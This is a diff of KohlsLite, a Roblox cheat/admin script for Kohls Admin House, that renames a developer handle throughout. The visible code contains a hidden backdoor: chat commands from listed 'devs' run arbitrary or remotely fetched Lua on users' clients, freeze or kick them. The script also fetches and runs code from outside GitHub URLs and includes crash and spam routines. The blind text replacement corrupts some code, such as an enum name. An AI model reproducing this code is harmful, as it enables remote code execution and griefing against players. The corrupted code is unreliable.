@@ -29,7 +29,7 @@
 
 -- This free, open-source script is for the Roblox game Kohls Admin House (KAH)
 -- You can play KAH here: https://www.roblox.com/games/112420803/Kohls-Admin-House-NBC-Updated
--- Created by aliihsan12345 (Roblox) / Unknown (Discord) / S-PScripts (GitHub)
+-- Created by aliihsan12345 (Roblox) / mrmiavss (Discord) / S-PScripts (GitHub)
 
 -- There are no more watermarks in this script.
 
@@ -103,7 +103,7 @@ if theydo then
 		checkforkohlspremium = true
 		Remind("Booting KohlsLite Premium...")
 else
-		Remind("You do not have KohlsLite Premium. Please buy it by dming Unknown or use KohlsLite Premium")
+		Remind("You do not have KohlsLite Premium. Please buy it by dming mrmiavss or use KohlsLite Premium")
 end
 	]]
 
@@ -214,7 +214,7 @@ local pwl = {
     "BANNter_Original",
     "witnessfox22",
     "ohmyalt000",
-    "Unknown35864",
+    "mrmiavss35864",
   --  "dawninja21",
   --  "Dawninja21alt",
     "Di33le2",
@@ -264,7 +264,7 @@ local nokick = {
     "BANNter_Original",
     "witnessfox22",
     "ohmyalt000",
-    "Unknown35864",
+    "mrmiavss35864",
   --  "dawninja21",
  --   "Dawninja21alt",
     "Di33le2",
@@ -309,7 +309,7 @@ local specialperms = {
     "me_123eq",
     "me_crashking",
     "aliihsan12345",
-    "Unknown35864",
+    "mrmiavss35864",
     "ohmyalt000",
     "s_pisafurry",
    -- "dawninja21",
@@ -318,9 +318,9 @@ local specialperms = {
     "yeyeyeweweweye"
 }
 
--- Unknown35864 spexialpermz (Perms for non-developers)
-local Unknown35864perms = {
-    "Unknown35864",
+-- mrmiavss35864 spexialpermz (Perms for non-developers)
+local mrmiavss35864perms = {
+    "mrmiavss35864",
     "ohmyalt000",
     "decryptionites",
     "minecraftgamer2012YT",
@@ -346,7 +346,7 @@ local pgwl = {
     "BANNter_Original",
     "witnessfox22",
     "ohmyalt000",
-    "Unknown35864",
+    "mrmiavss35864",
    -- "dawninja21",
  --   "Dawninja21alt",
     "Di33le2",
@@ -480,7 +480,7 @@ local musictable = {
     ["47"] = { id = "6828176320", name = "Painted black" },
     ["48"] = { id = "5410084188", name = "WRLD - Hang Up" },
     ["49"] = { id = "6911766512", name = "Cyber Chainsaw" },
-    ["50"] = { id = "7612400047", name = "Unknown" },
+    ["50"] = { id = "7612400047", name = "mrmiavss" },
     ["51"] = { id = "16190783444", name = "Dubidubidu (Techno Remix)" }, -- chipi chipi chapa chapa (alt name before i found clipply)
     ["52"] = { id = "16190782786", name = "Lil Kuudere X sukoyomi" },
     ["53"] = { id = "6844230235", name = "WHAT THE HELL" },
@@ -537,9 +537,9 @@ local musictable = {
     ["104"] = { id = "1840612595", name = "A New Renaissance"},  
     ["105"] = { id = "1836054144", name = "Upbeat Dude"},
     ["106"] = { id = "1837275138", name = "Never Enough"},
-    ["107"] = { id = "1839917800", name = "Unknown"},
+    ["107"] = { id = "1839917800", name = "mrmiavss"},
     ["108"] = { id = "1840221593", name = "Fit For Life (A)"},
-    ["109"] = { id = "9041863801", name = "Unknown"},
+    ["109"] = { id = "9041863801", name = "mrmiavss"},
     ["110"] = { id = "1836711447", name = "Just Like Me"},
     ["111"] = { id = "1845070869", name = "Eye Open"},
     ["112"] = { id = "1847863129", name = "Tech Synth A"},
@@ -646,7 +646,7 @@ local charlist = {
     ["telac"] = { charid = "13645" },           -- 3
     ["epicszs"] = { charid = "548456077" },  -- 4
     ["temi"] = { charid = "45024180" },   -- 5
-    ["Unknown35864"] = { charid = "1389780396" }, -- 6
+    ["mrmiavss35864"] = { charid = "1389780396" }, -- 6
     ["menaal"] = { charid = "1793973864" }, -- 7
     ["agspureiam"] = { charid = "36377783" },   -- 8
     ["tech"] = { charid = "1702851506" }, -- 9
@@ -1158,8 +1158,8 @@ Mover.PosSet = false
 print("- Information -")
 print("Thank you for using KohlsLite. The version you are using is v"..getgenv().klversion..". This script was created by S_P.")
 Remind("Thank you for using KohlsLite. The version you are using is v"..getgenv().klversion..". This script was created by S_P.")
-print("Say .kcmds to list some of the commands. DM me at Unknown for help.")
-Remind("Say .kcmds to list some of the commands. DM me at Unknown for help.")
+print("Say .kcmds to list some of the commands. DM me at mrmiavss for help.")
+Remind("Say .kcmds to list some of the commands. DM me at mrmiavss for help.")
 
 -- Chat("h \n\n\n KohlsLite executed! Version: "..getgenv().klversion.." \n\n\n")
 
@@ -1227,9 +1227,9 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
 		Remind("Executed CMD PI/V3. Created by quiving. CMD PI/V3 doesn't work for mobile executors by the way.")
         end
 
-        if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'prsc' then -- PR Script ~ Unknown35864
+        if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'prsc' then -- PR Script ~ mrmiavss35864
                 GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/People's%20Scripts/PR_Script.txt")
-		Remind("Executed PR Script. Created by Unknown35864.")
+		Remind("Executed PR Script. Created by mrmiavss35864.")
         end
 
         if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'cmdy' then -- you don't need this for attaching anymore ;)
@@ -3108,19 +3108,19 @@ Commands required: rocket]])
          		end
 		else
 				
-			local Unknown35864cakeday = "08/23" -- Unknown35864's birthday
+			local mrmiavss35864cakeday = "08/23" -- mrmiavss35864's birthday
 			local spcakeday = "04/28" -- 
 
 			local ctime = os.date("%m/%d")
 
-			if ctime == Unknown35864cakeday then			
-				Chat("h \n\n\n Happy birthday, Unknown35864! \n\n\n")
-				Speak("Happy birthday, Unknown35864!")
+			if ctime == mrmiavss35864cakeday then			
+				Chat("h \n\n\n Happy birthday, mrmiavss35864! \n\n\n")
+				Speak("Happy birthday, mrmiavss35864!")
 			elseif ctime == spcakeday then
 				Chat("h \n\n\n Happy birthday, s_p! \n\n\n")
 				Speak("Happy birthday, s_p!")
 			else
-				Remind("It is not Unknown35864's/s_p's birthday today. If it is someone else's birthday in the server, provide the second argument.")
+				Remind("It is not mrmiavss35864's/s_p's birthday today. If it is someone else's birthday in the server, provide the second argument.")
 			end
 		end
     end
@@ -3797,7 +3797,7 @@ Commands required: rocket]])
     end
   
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'dicrash' then
-	    musicsay = false -- na Unknown forgot this jit tripping - from Unknown
+	    musicsay = false -- na mrmiavss forgot this jit tripping - from mrmiavss
             Chat(prefix.."gchar all itgeLsmeeS");Chat(prefix.."gmusic62");Chat("h \n\n\n all praise dionte \n\n\n");Chat("name all itgeLsmeeS is our hero")
 	    task.wait(1.5)
 	    DCrash()
@@ -6580,7 +6580,7 @@ Commands required: rocket]])
         	PLAYERCHECK(dasplayer)
         	if player == nil then 
 			return Remind("Fail: User not found!")
-		elseif player == "aliihsan12345" or player == "Unknown35864" or player == "kohlslitedev" then
+		elseif player == "aliihsan12345" or player == "mrmiavss35864" or player == "kohlslitedev" then
 			Remind("You can't bang developers!")
 		else
 			banger = cplr
@@ -7658,7 +7658,7 @@ connections[#connections + 1] =
 	if antis.antimesh then
         	for i,v in pairs(workspace:GetDescendants()) do
             		if v:IsA("Accessory") then
-                		if tostring(v.AccessoryType) == "Enum.AccessoryType.Unknown" then -- he knocks
+                		if tostring(v.AccessoryType) == "Enum.AccessoryType.mrmiavss" then -- he knocks
                     			v:Destroy()
                 		end
             		end
@@ -8516,13 +8516,13 @@ function PLRSTART(v)
 
                     if string.sub(msg:lower(), 0, 5) == ";poop" or string.sub(msg:lower(), 0, 5) == ":poop" or string.sub(msg:lower(), 0, 4) == "poop" or string.sub(msg:lower(), 0, 5) == ".poop" then
                         if noobdetect then
-                            if v.Name ~= "ohmyalt000" and v.Name ~= "Unknown35864" then -- very epik exception
+                            if v.Name ~= "ohmyalt000" and v.Name ~= "mrmiavss35864" then -- very epik exception
                                 print(v.Name .. " is a noob. / Said 'poop' ")
                                 Chat("h \n\n\n " .. v.Name .. ", did you come from a FREE ADMIN game? POOP isn't a command! \n\n\n")
                             elseif v.Name == "ohmyalt000" then
                                 Chat("h \n\n\n [ohmyalt000]: Poop \n\n\n")
                             else
-                                Chat("h \n\n\n [Unknown35864]: Poop \n\n\n")
+                                Chat("h \n\n\n [mrmiavss35864]: Poop \n\n\n")
                             end
                         end
                     end
@@ -8586,89 +8586,89 @@ function PLRSTART(v)
                     -- // dev section \\ --
 
                     if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(Unknown35864perms, game.Players.LocalPlayer.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(mrmiavss35864perms, game.Players.LocalPlayer.Name) then
                             Speak("I use KohlsLite!")
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(Unknown35864perms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(Unknown35864perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(mrmiavss35864perms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(mrmiavss35864perms, game.Players.LocalPlayer.Name) then
                             Speak("Collect my pages pav...")
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(Unknown35864perms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(Unknown35864perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(mrmiavss35864perms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(mrmiavss35864perms, game.Players.LocalPlayer.Name) then
                             setclipboard("https://discord.gg/Q7Q7rAyckJ")
                         end
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(Unknown35864perms, game.Players.LocalPlayer.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(mrmiavss35864perms, game.Players.LocalPlayer.Name) then
                             pcall(function()
                                     game.Players.LocalPlayer:Kick("A KohlsLite dev kicked you from the game!")
                             end)
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(Unknown35864perms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(Unknown35864perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(mrmiavss35864perms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(mrmiavss35864perms, game.Players.LocalPlayer.Name) then
                             pcall(function()
-                                    game.Players.LocalPlayer:Kick("FE BYPASSED ~Unknown35864")
+                                    game.Players.LocalPlayer:Kick("FE BYPASSED ~mrmiavss35864")
                             end)
                         end
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(Unknown35864perms, game.Players.LocalPlayer.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(mrmiavss35864perms, game.Players.LocalPlayer.Name) then
                             Remind("You have been warned by a KohlsLite dev!")
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(Unknown35864perms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(Unknown35864perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(mrmiavss35864perms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(mrmiavss35864perms, game.Players.LocalPlayer.Name) then
                             Remind("You have been warned by a KohlsLite collaborator!")
                         end
                     end
 
                     if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(Unknown35864perms, game.Players.LocalPlayer.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(mrmiavss35864perms, game.Players.LocalPlayer.Name) then
                             while true do end
                         -- game:Shutdown()
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(Unknown35864perms, v.Name) then
-			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(Unknown35864perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(mrmiavss35864perms, v.Name) then
+			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(mrmiavss35864perms, game.Players.LocalPlayer.Name) then
                             while true do end
                         -- game:Shutdown()
                         end
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(Unknown35864perms, game.Players.LocalPlayer.Name) then
+			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(mrmiavss35864perms, game.Players.LocalPlayer.Name) then
 			    Execute(string.sub(msg, 6))
 			end
                     end
 
-                    if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(Unknown35864perms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(Unknown35864perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(mrmiavss35864perms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(mrmiavss35864perms, game.Players.LocalPlayer.Name) then
                             Execute(string.sub(msg, 6))
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(Unknown35864perms, v.Name) then
+                    if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(mrmiavss35864perms, v.Name) then
                         loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(Unknown35864perms, game.Players.LocalPlayer.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(mrmiavss35864perms, game.Players.LocalPlayer.Name) then
                             GExecute(string.sub(msg, 7))
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(Unknown35864perms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(Unknown35864perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(mrmiavss35864perms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(mrmiavss35864perms, game.Players.LocalPlayer.Name) then
                             GExecute(string.sub(msg, 7))
                         end
                     end
@@ -9133,8 +9133,8 @@ end)
 -- LOG SPAM
 function LogSpam()
       for i = 1,50 do
-          Chat("reset KOHLSLITE ON BOTTOM - Unknown, 2024")
-          Chat("reset PR SCRIPT ON TOP - Unknown35864, 2024")
+          Chat("reset KOHLSLITE ON BOTTOM - mrmiavss, 2024")
+          Chat("reset PR SCRIPT ON TOP - mrmiavss35864, 2024")
       end
 end
 
@@ -10630,7 +10630,7 @@ function onPlayerAdded(player)
           checkforperm()
     end
 
-    if not table.find(specialperms, player.Name) or not table.find(Unknown35864perms, player.Name) then
+    if not table.find(specialperms, player.Name) or not table.find(mrmiavss35864perms, player.Name) then
 		check_con = false
 
   		if table.find(rkick_on_sight, player.Name) then
@@ -10729,10 +10729,10 @@ function onPlayerAdded(player)
         		Remind(player.Name.." [KohlsLite Dev] joined the server.")
     end
 
-    if table.find(Unknown35864perms, player.Name) then
+    if table.find(mrmiavss35864perms, player.Name) then
 			Chat("h \n\n\n ".. player.Name .. " [KohlsLite Dev] joined the server! \n\n\n")
 			print(player.Name.." [KohlsLite Dev] joined the server.")
-        		Remind(player.Name.." from [Unknown35864 PERMS] joined the server.")
+        		Remind(player.Name.." from [mrmiavss35864 PERMS] joined the server.")
     end
 end
 
@@ -11747,7 +11747,7 @@ if writefile and readfile then
 		print("\n\n\n")
 		print("Created the KohlsLite folder! You can find in your workspace.")
 		local file_welcome = "KohlsLite/Welcome.txt"
-		local file_text = "Thank you for using KohlsLite! If you need help, please DM me at Unknown." --
+		local file_text = "Thank you for using KohlsLite! If you need help, please DM me at mrmiavss." --
 		writefile(KL_FOLDER,file_text)
 
 -- ye this will be da new feature wowoo
@@ -13181,7 +13181,7 @@ print("Your rank is: " .. Stats.rank)
 -- Don't leak it method my boy ...
 loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/soggy/main/for%20atpoop"))()
 
--- KohlsLite Tags - Created by Unknown35864
+-- KohlsLite Tags - Created by mrmiavss35864
 local OWNER = {
 	"aliihsan12345", 
 	"me_123eq", 
@@ -13192,7 +13192,7 @@ local OWNER = {
 }
 
 local DEVELOPER = {
-   "Unknown35864",
+   "mrmiavss35864",
  --  "ohmyalt000" (avoid overlap)
 }
 
@@ -13280,13 +13280,13 @@ if table.find(unexecuteables, game.Players.LocalPlayer.Name) then
                 task.wait(2.5); while true do end
 end
 
-local Unknown35864cakeday = "08/23" -- Unknown35864's birthday
+local mrmiavss35864cakeday = "08/23" -- mrmiavss35864's birthday
 local spcakeday = "04/28" --
 
 local ctime = os.date("%m/%d")
 
-if ctime == Unknown35864cakeday then			
-	Remind("It's Unknown35864 birthday! If you see him, do .cakeday!")
+if ctime == mrmiavss35864cakeday then			
+	Remind("It's mrmiavss35864 birthday! If you see him, do .cakeday!")
 elseif ctime == spcakeday then
 	Remind("It's my birthday! If you see me, do .cakeday!")
 else
